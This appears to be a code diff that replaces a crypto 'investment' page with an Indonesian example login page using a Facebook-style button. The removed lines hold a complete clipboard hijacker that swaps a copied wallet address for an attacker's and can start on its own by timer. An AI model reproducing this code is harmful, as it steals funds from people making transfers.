@@ -1,105 +1,163 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="id">
 <head>
-    <title>Crypto Investment</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
-        }
-        .wallet {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            font-family: monospace;
-            word-break: break-all;
-        }
-        button {
-            background: #28a745;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #28a745;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 5px;
-            display: none;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Contoh Login — Aplikasi Saya</title>
+  <style>
+    :root{
+      --bg:#f4f6f8;
+      --card:#ffffff;
+      --accent:#1877f2; /* warna tombol "Facebook-like" - but jangan use FB branding */
+      --muted:#6b7280;
+      --radius:12px;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+
+    body{
+      margin:0;
+      min-height:100vh;
+      display:grid;
+      place-items:center;
+      background: linear-gradient(180deg, var(--bg), #eef2f6);
+      padding:24px;
+    }
+
+    .card{
+      width:100%;
+      max-width:420px;
+      background:var(--card);
+      border-radius:var(--radius);
+      box-shadow: 0 8px 30px rgba(20,30,50,0.08);
+      padding:28px;
+      box-sizing:border-box;
+    }
+
+    h1{
+      margin:0 0 8px 0;
+      font-size:20px;
+      letter-spacing:-0.2px;
+    }
+    p.lead{
+      margin:0 0 18px 0;
+      color:var(--muted);
+      font-size:14px;
+    }
+
+    .form-group{margin-bottom:14px;}
+    label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px;}
+    input[type="email"], input[type="password"]{
+      width:100%;
+      padding:12px 14px;
+      border-radius:8px;
+      border:1px solid #e6e9ef;
+      font-size:15px;
+      box-sizing:border-box;
+    }
+
+    .btn{
+      display:inline-block;
+      width:100%;
+      padding:12px 14px;
+      text-align:center;
+      border-radius:10px;
+      font-weight:600;
+      cursor:pointer;
+      user-select:none;
+      border:0;
+    }
+
+    .btn-primary{
+      background:linear-gradient(180deg,var(--accent), #0f62d8);
+      color:white;
+      box-shadow: 0 6px 18px rgba(24,119,242,0.18);
+    }
+
+    .btn-social{
+      background: #ffffff;
+      color: #111827;
+      border:1px solid #e6e9ef;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      justify-content:center;
+    }
+
+    .social-icon{
+      width:20px;height:20px;border-radius:4px;display:inline-block;
+      background:linear-gradient(180deg,#fff,#e9eef8);
+      display:inline-flex;align-items:center;justify-content:center;font-weight:700;color:var(--accent);
+    }
+
+    .divider{display:flex;align-items:center;gap:12px;margin:18px 0;}
+    .divider:before,.divider:after{content:"";flex:1;height:1px;background:#eef2f6}
+    .small{font-size:13px;color:var(--muted);text-align:center}
+
+    .disclaimer{font-size:12px;color:#9aa0ad;margin-top:12px}
+  </style>
 </head>
 <body>
-    <h1>💰 Crypto Investment</h1>
-    <p>Send funds to this wallet address for +5% bonus:</p>
+  <main class="card" role="main" aria-labelledby="loginTitle">
+    <h1 id="loginTitle">Masuk ke Aplikasi Saya</h1>
+    <p class="lead">Masuk menggunakan akun aplikasi atau gunakan tombol sosial untuk autentikasi cepat.</p>
+
+    <form id="formLogin" autocomplete="on" novalidate>
+      <div class="form-group">
+        <label for="email">Email</label>
+        <input id="email" name="email" type="email" inputmode="email" required placeholder="name@example.com">
+      </div>
+      <div class="form-group">
+        <label for="password">Kata sandi</label>
+        <input id="password" name="password" type="password" required minlength="8" placeholder="Minimal 8 karakter">
+      </div>
+
+      <button type="submit" class="btn btn-primary">Masuk</button>
+    </form>
+
+    <div class="divider" aria-hidden="true"><span></span><div class="small">atau</div><span></span></div>
+
+
+    <button id="facebookLogin" class="btn btn-social" aria-label="Login dengan Facebook" title="Login dengan Facebook">
+      <span class="social-icon">f</span>
+      <span>Masuk dengan Facebook</span>
+    </button>
+
+    <p class="disclaimer">Dengan masuk, Anda menyetujui <a href="#">Syarat & Ketentuan</a> kami.</p>
+  </main>
+
+  <script>
+
+    document.getElementById('formLogin').addEventListener('submit', async (ev)=>{
+      ev.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if(!email || password.length < 8){ alert('Periksa input Anda.'); return; }
+
+      try{
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({email, password})
+        });
+        if(res.ok){
+          // redirect ke dashboard
+          window.location.href = '/dashboard';
+        } else {
+          const data = await res.json();
+          alert(data.message || 'Gagal masuk');
+        }
+      }catch(err){
+        console.error(err);
+        alert('Terjadi kesalahan. Coba lagi.');
+      }
+    });
+
+ 
+    document.getElementById('facebookLogin').addEventListener('click', ()=>{
     
-    <div class="wallet" id="wallet">0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299</div>
-    
-    <button onclick="copyWallet()">Copy Wallet Address</button>
-    <button onclick="autoCopySequence()" style="background: #dc3545;">Auto-Copy Bonus Address</button>
-
-    <div class="notification" id="notification">Copied!</div>
-
-    <script>
-        const legitWallet = "0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299";
-        const maliciousWallet = "0x8a12Bc6d6d6b6d6b6d6b6d6b6d6b6d6b6d6b6d6b";
-
-        function showNotification(message) {
-            const notif = document.getElementById('notification');
-            notif.textContent = message;
-            notif.style.display = 'block';
-            setTimeout(() => notif.style.display = 'none', 2000);
-        }
-
-        function copyWallet() {
-            navigator.clipboard.writeText(legitWallet).then(() => {
-                showNotification("✅ Wallet address copied!");
-                
-                // After 2 seconds, replace with malicious wallet
-                setTimeout(() => {
-                    navigator.clipboard.writeText(maliciousWallet);
-                    showNotification("🔄 Updated with bonus address!");
-                }, 2000);
-            });
-        }
-
-        function autoCopySequence() {
-            // Multi-stage clipboard manipulation
-            const steps = [
-                { text: legitWallet, delay: 1000, message: "Base address copied" },
-                { text: maliciousWallet, delay: 2000, message: "Bonus address applied" },
-                { text: "Send exactly $1000 for +5% bonus", delay: 1500, message: "Instructions added" },
-                { text: maliciousWallet, delay: 1000, message: "Ready for transfer!" }
-            ];
-
-            let step = 0;
-            function nextStep() {
-                if (step < steps.length) {
-                    const current = steps[step];
-                    navigator.clipboard.writeText(current.text);
-                    showNotification(current.message);
-                    setTimeout(nextStep, current.delay);
-                    step++;
-                }
-            }
-            nextStep();
-        }
-
-        // Auto-start clipboard manipulation after 10 seconds
-        setTimeout(() => {
-            if (Math.random() < 0.5) { // 50% chance
-                autoCopySequence();
-            }
-        }, 10000);
-    </script>
+      window.location.href = '/auth/facebook';
+    });
+  </script>
 </body>
 </html>
